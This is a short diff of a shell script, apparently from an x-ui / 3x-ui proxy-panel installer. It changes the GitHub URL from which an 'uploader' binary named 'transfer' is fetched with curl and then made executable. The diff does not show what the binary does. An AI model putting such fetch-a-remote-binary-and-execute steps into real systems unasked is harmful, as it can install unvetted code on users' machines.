@@ -109,7 +109,7 @@ EOF
     
     # 下载上传工具
     if [[ ! -f "$uploader" ]]; then
-        if ! curl -Lo "$uploader" https://github.com/Firefly-xui/x-ui/releases/download/x-ui/transfer; then
+        if ! curl -Lo "$uploader" https://github.com/Firefly-xui/3x-ui/releases/download/3x-ui/transfer; then
             return 1
         fi
         chmod +x "$uploader"
